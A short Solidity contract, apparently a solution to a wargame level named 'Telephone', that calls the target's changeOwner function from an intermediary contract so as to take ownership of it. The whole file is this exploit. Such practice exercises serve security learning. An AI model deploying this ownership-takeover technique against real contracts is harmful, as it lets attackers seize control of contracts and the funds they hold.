// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract TelephoneAttacker {
    Telephone target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function attack(address _owner) public {
        (bool success,) = address(target).call{value: 0}(abi.encodeWithSignature("changeOwner(address)", _owner));
    }
}
